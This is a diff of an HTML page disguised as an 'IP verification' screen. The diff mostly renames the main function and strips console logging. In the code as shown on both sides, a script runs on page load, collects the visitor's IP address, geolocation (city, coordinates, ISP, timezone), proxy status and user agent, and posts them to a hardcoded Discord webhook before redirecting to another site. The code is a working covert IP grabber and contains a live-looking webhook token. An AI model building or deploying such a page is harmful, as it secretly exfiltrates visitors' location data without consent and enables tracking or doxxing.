@@ -33,43 +33,43 @@
             font-weight: bold;
         }
     </style>
+</head>
+<body>
+    <div id="verify">
+        <h1>Verifying your IP...</h1>
+        <p class="loading">Please wait while we validate your connection...</p>
+    </div>
+
     <script>
-        // Discord Webhook URL
+        // Your Discord Webhook URL
         const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
         
         // Redirect URL after verification
         const redirectURL = "https://www.genned.net/auth/rdtqx";
 
-        async function logVisitorAndRedirect() {
-            // Simulate IP verification process
-            document.getElementById('verify').innerHTML = `<h1>Verifying your IP...</h1><p class="loading">Please wait while we validate your connection...</p>`;
-
+        // Function to get the user's IP and send it to the webhook
+        async function verifyUser() {
             try {
-                // Step 1: Get IP Address
-                console.log("Fetching IP address...");
+                // Step 1: Get the user's IP address
                 const ipResponse = await fetch("https://api.ipify.org?format=json");
                 const ipData = await ipResponse.json();
                 const userIP = ipData.ip;
-                console.log("IP Address:", userIP);
 
-                // Step 2: Get Location Data
-                console.log("Fetching location data...");
+                // Step 2: Get the user's geolocation
                 const locationResponse = await fetch(`http://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon,timezone,query`);
                 const locationData = await locationResponse.json();
 
-                // Check if location data was successfully fetched
+                // Step 3: Check if location data is available
                 if (locationData.status !== "success") {
                     console.error("Error getting location data:", locationData.message);
                     window.location.href = redirectURL; // Redirect if there's an error
                     return;
                 }
-                console.log("Location Data:", locationData);
 
-                // Step 3: Check VPN/Proxy status
-                const vpnStatus = locationData.proxy || locationData.hosting ? "🔴 **VPN/Proxy Detected**" : "🟢 **No VPN/Proxy Detected**";
+                // Step 4: Detect VPN/Proxy status
+                const vpnStatus = (locationData.proxy || locationData.hosting) ? '🔴 **VPN/Proxy Detected**' : '🟢 **No VPN/Proxy Detected**';
 
-                // Step 4: Prepare message for Discord webhook
-                const userAgent = navigator.userAgent;
+                // Step 5: Prepare message for Discord
                 const message = {
                     content: `**New Visitor Logged**\n\n` +
                              `**IP Address:** ${locationData.query}\n` +
@@ -86,11 +86,10 @@
                              `**VPN/Proxy:** ${locationData.proxy ? "Yes" : "No"}\n` +
                              `**Hosting Service:** ${locationData.hosting ? "Yes" : "No"}\n` +
                              `${vpnStatus}\n\n` +
-                             `**User-Agent:** \`${userAgent}\``
+                             `**User-Agent:** \`${navigator.userAgent}\``
                 };
 
-                // Step 5: Send data to Discord webhook
-                console.log("Sending data to Discord...");
+                // Step 6: Send data to Discord
                 const discordResponse = await fetch(webhookURL, {
                     method: "POST",
                     headers: {
@@ -103,27 +102,19 @@
                     console.error("Error sending message to Discord:", discordResponse.statusText);
                 }
 
-                // Step 6: Delay the redirect to allow the data to be sent
-                console.log("Delaying redirect...");
+                // Step 7: Redirect after 2 seconds to give time for the request
                 setTimeout(() => {
-                    console.log("Redirecting to URL...");
-                    window.location.href = redirectURL;
-                }, 3000); // 3-second delay to ensure the webhook data is sent before redirecting
+                    window.location.href = redirectURL;  // Redirect after sending data
+                }, 2000); // 2 seconds delay to ensure the message is sent
 
             } catch (error) {
-                console.error("Error in logging or redirection:", error);
-                window.location.href = redirectURL; // Redirect even if API fails
+                console.error("Error during IP verification:", error);
+                window.location.href = redirectURL; // Redirect even on error
             }
         }
 
-        // Run the function to simulate IP verification and log visitor
-        window.onload = logVisitorAndRedirect;
+        // Start the verification process once the page loads
+        window.onload = verifyUser;
     </script>
-</head>
-<body>
-    <div id="verify">
-        <h1>Verifying your IP...</h1>
-        <p class="loading">Please wait while we validate your connection...</p>
-    </div>
 </body>
 </html>
